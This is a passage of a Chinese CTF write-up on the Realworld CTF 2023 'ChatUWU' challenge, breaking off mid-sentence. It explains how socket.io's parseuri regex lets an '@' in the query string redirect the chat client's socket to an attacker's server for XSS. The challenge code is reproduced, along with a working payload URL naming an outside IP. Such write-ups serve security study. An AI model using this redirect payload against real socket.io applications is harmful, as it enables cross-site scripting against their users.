---
title: Realworld CTF 2023 ChatUWU 详解
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458499288&idx=2&sn=cb04969bed75f826d5b9effd3ef47d93&chksm=b18e885286f901445c4bf1c868b51ccb423c8c9b7027e9908f11f8153ce3068a965e04fb808e&scene=58&subscene=0#rd
source: 看雪学苑
date: 2023-03-25
fetch_date: 2025-10-04T10:37:24.179016
---

# Realworld CTF 2023 ChatUWU 详解

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FJjl92zYviaHbyrEZEZzyZFrXfN83Gv4563CAfBccjAlE8AXW0fkxwEdfrg6pkibYuGDjPs6lyDHzA/0?wx_fmt=jpeg)

# Realworld CTF 2023 ChatUWU 详解

pank1s

看雪学苑

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GbQvhTibRqum43S5vS4kHrEkQaglLmYpvicAfKC5PKdSbRyLCx2vSBhqbEVA5ZTAHMGryYBJ3H2cibQ/640?wx_fmt=jpeg)

本文为看雪论坛优秀文章

看雪论坛作者ID：pank1s

一个基于 socket.io 的聊天室，当时进去很混乱，也很纳闷一个公共的聊天室打XSS别人不会上车吗？但实际不是这样的，重点是这个 socket.io 的问题 （准确来说是socket.io 中的parseuri问题）。

题目给了源码，前端index.html关键部分。

```
<script>    function reset() {        location.href = `?nickname=guest${String(Math.random()).substr(-4)}&room=textContent`;    }
    let query = new URLSearchParams(location.search),        nickname = query.get('nickname'),        room = query.get('room');    if (!nickname || !room) {        reset();    }    for (let k of query.keys()) {        if (!['nickname', 'room'].includes(k)) {            reset();        }    }    document.title += ' - ' + room;    let socket = io(`/${location.search}`),        messages = document.getElementById('messages'),        form = document.getElementById('form'),        input = document.getElementById('input');
    form.addEventListener('submit', function (e) {        e.preventDefault();        if (input.value) {            socket.emit('msg', {from: nickname, text: input.value});            input.value = '';        }    });
    socket.on('msg', function (msg) {        let item = document.createElement('li'),            msgtext = `[${new Date().toLocaleTimeString()}] ${msg.from}: ${msg.text}`;        room === 'DOMPurify' && msg.isHtml ? item.innerHTML = msgtext : item.textContent = msgtext;        console.log(msgtext);        messages.appendChild(item);        window.scrollTo(0, document.body.scrollHeight);    });
    socket.on('error', msg => {        alert(msg);        reset();    });</script>
```

后端index.js：

```
const app = require('express')();const http = require('http').Server(app);const io = require('socket.io')(http);const DOMPurify = require('isomorphic-dompurify');
const hostname = process.env.HOSTNAME || '0.0.0.0';const port = process.env.PORT || 8000;const rooms = ['textContent', 'DOMPurify'];

app.get('/', (req, res) => {    res.sendFile(__dirname + '/index.html');});
io.on('connection', (socket) => {    let {nickname, room} = socket.handshake.query;    if (!rooms.includes(room)) {        socket.emit('error', 'the room does not exist');        socket.disconnect(true);        return;    }    socket.join(room);    io.to(room).emit('msg', {        from: 'system',        // text: `${nickname} has joined the room`        text: 'a new user has joined the room'    });    socket.on('msg', msg => {        msg.from = String(msg.from).substr(0, 16)        msg.text = String(msg.text).substr(0, 140)        console.log(DOMPurify.sanitize(msg.from))        console.log(DOMPurify.sanitize(msg.text))        if (room === 'DOMPurify') {            io.to(room).emit('msg', {                from: DOMPurify.sanitize(msg.from),                text: DOMPurify.sanitize(msg.text),                isHtml: true            });        } else {            io.to(room).emit('msg', {                from: msg.from,                text: msg.text,                isHtml: false            });        }    });});
http.listen(port, hostname, () => {    console.log(`ChatUWU server running at http://${hostname}:${port}/`);});
```

后端使用了DOMPurify来对传入的 from 和 text 进行了过滤，看了下这个版本的 DOMPurify 是^0.24.0的，基本没有漏洞。然后就不会了，做不出来。

赛后参考 https://ctftime.org/writeup/36057

发现这题实际上是让前端的socket连接到我们自己的服务器上从而实现xss的。

这位是师傅的payload是这样的：

http://47.254.28.30:58000/?room=DOMPurify&nickname=guest5279@85.244.211.240:9000

@ 后面是自己的服务器地址。那这是什么原理呢？

### **详细分析**

注意他前端连接socket服务器的地方是这样的，前端我们唯一能方便控制的也就是 location.search ，同时也注意到他这个xssbot只能接收 http://47.254.28.30:58000/开头的链接，那多半是这个查询参数的问题了。

```
let socket = io(`/${location.search}`),        messages = document.getElementById('messages'),        form = document.getElementById('form'),        input = document.getElementById('input');
```

location.search就是url中的查询参数，所以我们正常情况下是这样连接的 let socket = io("/?nickname=guest0611&room=DOMPurify")没啥好的办法，就前端一步步调试吧。

打断点开始一步步调试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbQvhTibRqum43S5vS4kHrE8rdCpmDbEmjaxvfPClmYmFlhEnaibvziaq7tibgBTmbgfk1VNaloV9BZw/640?wx_fmt=png)

进入 io 后跳转到 lookup 函数中：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbQvhTibRqum43S5vS4kHrEekOawFjCB84P7mcLMwputW3tmuIDEHYbYPnFoKibyicqhmsZ0q4XVUOA/640?wx_fmt=png)

lookup 函数会创建一个 Manager 对象从而连接 ws服务器。

继续跟进：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbQvhTibRqum43S5vS4kHrEHdiamsZRAszEI3oxdpNzZjU6eN5b3vFdTGw1dx32LP8BHsCuQQRzIsQ/640?wx_fmt=png)

对象里的 this.uri 是我们给的链接，后续会在 this.open中打开该链接对应的host从而连接socket服务器。

继续跟进：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbQvhTibRqum43S5vS4kHrExq7YWVibn6rqHrH7IUqXd1qP5MB8QVgUnYv7vviawJ4pjx4nh3QXxWAw/640?wx_fmt=png)

open方法中可以看到 109 行已经确定了socket连接的hostname，所以我们跟进到 108 行进入Engine类中看是如何根据 uri 确定hostname的

进入 108 行的 Engine中。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbQvhTibRqum43S5vS4kHrEcmUqmeWbnhkd4khdfiaMcOVh2w4PxIE1dqvcdT7k6VoLpqnAPokU0vQ/640?wx_fmt=png)

跟进后发现跳转到了 socket.js 里，这里才真正进入到 socket 本体里，看看是如何解析uri的。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbQvhTibRqum43S5vS4kHrEwZuBs5ObqroQOVLjicE6PO9qg9SS0xkg0ydSzfdkQH5SORibykQDFRiag/640?wx_fmt=png)

22行有个 parse 方法，uri经过 parse 方法解析后拿到host，然后再经过一次 parse 方法解析后就拿到了最终的hostname了。关键是看看这个 parse 方法是如何解析的。

跟进 22行的parse，发现该解析uri的代码来自 https://github.com/galkn/parseuri

源码 parseuri.js

```
// imported from https://github.com/galkn/parseuri/** * Parses an URI * * @author Steven Levithan <stevenlevithan.com> (MIT license) * @api private */const re = /^(?:(?![^:@]+:[^:@\/]*@)(http|https|ws|wss):\/\/)?((?:(([^:@]*)(?::([^:@]*))?)?@)?((?:[a-f0-9]{0,4}:){2,7}[a-f0-9]{0,4}|[^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/;const parts = [    'source', 'protocol', 'authority', 'userInfo', 'user', 'password', 'host', 'port', 'relative', 'path', 'directory', 'file', 'query', 'anchor'];export function parse(str) {    const src = str, b = str.indexOf('['), e = str.indexOf(']');    if (b != -1 && e != -1) {        str = str.substring(0, b) + str.substring(b, e).replace(/:/g, ';') + str.substring(e, str.length);    }    let m = re.exec(str || ''), uri = {}, i = 14;    while (i--) {        uri[parts[i]] = m[i] || '';    }    if (b != -1 && e != -1) {        uri.source = src;        uri.host = uri.host.substring(1, uri.host.length - 1).replace(/;/g, ':');        uri.authority = uri.authority.replace('[', '').replace(']', '').replace(/;/g, ':');        uri.ipv6uri = true;    }    uri.pathNames = pathNames(uri, uri['path']);    uri.queryKey = queryKey(uri, uri['query']);    return uri;}function pathNames(obj, path) {    const regx = /\/{2,9}/g, names = path.replace(regx, "/").split("/");    if (path.slice(0, 1) == '/' || path.length === 0) {        names.splice(0, 1);    }    if (path.slice(-1) == '/') {        names.splice(names.length - 1, 1);    }    return names;}function queryKey(uri, query) {    const data = {};    query.replace(/(?:^|&)([^&=]*)=?([^&]*)/g, function ($0, $1, $2) {        if ($1) {            data[$1] = $2;        }    });    return data;}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbQvhTibRqum43S5vS4kHrEmgophLibcHhx4HQcf9SIKMRfaiackq8BNfrh8ZdermF8htB7E0G7icrfA/640?wx_fmt=png)

可以看到 str(http://47.254.28.30:58000/?room=DOMPurify&nickname=guest0611) 经过正则提取后得到了个14个元素的数组，将他们一一对应起来就构成了解析后的 uri 对象。

上文所用的payload正是因为这个正则提取的问题。（有兴趣的师傅可以看看这个很长的正则）

我们本地可以试一试，将上面的 parseuri.js 代码复制到控制台执行。（注意去除export）

执行：

```
console.log(parse("https://pankas.top/?aaa=test&name=pankas@127.0.0.1:8080"))
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GbQvhTibRqum43S5vS4kHrERtH9wnS4LZrbqFyVicNLLjUUcGOot0GQibb9nBicb8RibpgvDOI21ViccAQ/640?wx_fmt=png)

可以发现返回的 host 和 post都成了我们 @ 后面的这个了

socket.io 内部使用了 parseuri （https://github.com/galkn/parseuri）这个组件来解析给定的链接，而...